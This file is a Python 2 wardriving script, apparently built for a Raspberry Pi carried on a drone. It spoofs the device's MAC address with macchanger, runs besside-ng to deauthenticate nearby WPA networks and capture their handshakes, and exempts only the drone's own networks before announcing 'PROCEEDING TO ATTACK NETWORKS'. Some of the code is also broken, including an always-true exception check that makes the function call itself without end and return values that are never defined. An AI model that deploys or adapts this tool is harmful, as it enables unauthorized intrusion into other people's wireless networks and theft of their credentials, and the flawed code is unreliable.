import os
import sys
import socket
import operator
import subprocess
import time
import re

# USER must change this to what ever the wireless interface appears on their raspberry pi raspbian OS
# str_interface_selected = "wlx00c0ca96cebb"

# DEBUG test string
str_interface_selected = "wlan1"


# USER must edit the values of this to the BSSID of their drone and ESSID
# otherwise the drone WILL shoot itself down!
parrot_drone_ESSID = "ardrone2_REDACTED_DRONE_MODEL_NUMBER"
parrot_drone_BSSID = "REDACTED_DRONE_ESSID"
drone_controller_ESSID = "REDACTED_PHONE"
drone_controller_BSSID = "REDACTED_DRONE_BSSID"

# a subtask for this project is being added into the user_friendly folder, make it mandatory to have new users enter their drone BSSID and ESSID info


def start_besside(str_interface_selected, parrot_drone_ESSID, parrot_drone_BSSID, drone_controller_ESSID, drone_controller_BSSID):
    # do not change the following variables, these are meant to initialize them!

    # BUGFIX. Besside-ng fails to continually save more WPA handshakes if a wpa.cap file exists
    # The fix is to rename the original file with a unique timestr in the same directory so Besside-ng has another wpa.cap file it generates to work with.
    timestr = time.strftime("%Y%m%d-%H%M%S")
    os.chdir('/root/Cylon-Raider-Lite/logs/wardriver_xpress')
    os.system("echo '' > besside.log")
    # set ignore to drone network ID
    ignore_essid = parrot_drone_ESSID
    ignore_bssid = parrot_drone_BSSID
    str_ignore_line_for_besside = "{0}           \| Got WPA handshake                      \| {1} \|".format(str(ignore_essid),str(ignore_bssid))

    add_ignore_cmd = """echo {0} >> besside.log""".format(str(str_ignore_line_for_besside))
    os.system(add_ignore_cmd)
    print str_ignore_line_for_besside
    # set ignore to drone controller network ID
    ignore_essid = drone_controller_ESSID
    ignore_bssid = drone_controller_BSSID
    str_ignore_line_for_besside = "{0}           \| Got WPA handshake                      \| {1} \|".format(str(ignore_essid),str(ignore_bssid))

    add_ignore_cmd = """echo {0} >> besside.log""".format(str(str_ignore_line_for_besside))
    print str_ignore_line_for_besside
    os.system(add_ignore_cmd)
    add_blacklist_cmd = """cat /home/pi/homepidir/user_friendly/blacklist.txt >> besside.log"""
    os.system(add_blacklist_cmd)
    # terminate interfering programs
    cmd_str = """
    cd /root/Cylon-Raider-Lite/logs/wardriver_xpress
    mv wpa.cap wpa.cap.save.{1}.cap
    ifconfig {0} down
    macchanger -r -b {0}
    ifconfig {0} up
    """.format(str_interface_selected, timestr)
    print """

    #####################################
    SWAPPING BURNED-IN MAC ADDR
                &
    RESTARTING NETWORK INTERFACE: %s
    #####################################

    """ % str_interface_selected
    os.system(cmd_str)
    # then run besside-ng
    cmd_str = "besside-ng -W %s" % str_interface_selected
    os.system(cmd_str)
    with open('test.log', 'w') as f:
        proc = subprocess.Popen(cmd_str, shell=True, stdout=subprocess.PIPE)
        for c in iter(lambda: proc.stdout.read(1), ''):
            sys.stdout.write(c)
            f.write(c)
    if Exception:
        print """
        ##########################

        EXCEPTION DETECTED
        RESTARTING BESSIDE-NG

        ##########################
        """
        start_besside(str_interface_selected, parrot_drone_ESSID, parrot_drone_BSSID, drone_controller_ESSID, drone_controller_BSSID)
    else:
        os.system('clear')
        print """
        #############################

        STARTUP SUCCESSFUL
        PROCEEDING TO ATTACK NETWORKS

        #############################

        """
        for line in iter(proc.stdout.readline, ''):
            sys.stdout.write(line)
            f.write(line)

    return parrot_drone_ESSID, parrot_drone_BSSID, drone_controller_ESSID, drone_controller_BSSID,  rc
def grep_network_interfaces(str_interface_selected, parrot_drone_ESSID, parrot_drone_BSSID, drone_controller_ESSID, drone_controller_BSSID):

    start_besside(str_interface_selected, parrot_drone_ESSID, parrot_drone_BSSID, drone_controller_ESSID, drone_controller_BSSID)
    return parrot_drone_ESSID, parrot_drone_BSSID, drone_controller_ESSID, drone_controller_BSSID,  str_interface_selected, interface_results
def main():

    print """
    0: return parrot_drone_ESSID, parrot_drone_BSSID, drone_controller_ESSID, drone_controller_BSSID,  to main menu
    1: Start Wardriver Mode + besside-ng + macchanger (burned in address change)

    """

    opt_choice = 1

    if opt_choice == 1:
        grep_network_interfaces(str_interface_selected, parrot_drone_ESSID, parrot_drone_BSSID, drone_controller_ESSID, drone_controller_BSSID)
    elif opt_choice == 0:
        os.system('python /root/Cylon-Raider-Lite/Cylon_Raider_Main.py')
    else:
        print 'You have entered a invalid option'
        main()
    return parrot_drone_ESSID, parrot_drone_BSSID, drone_controller_ESSID, drone_controller_BSSID,
main()
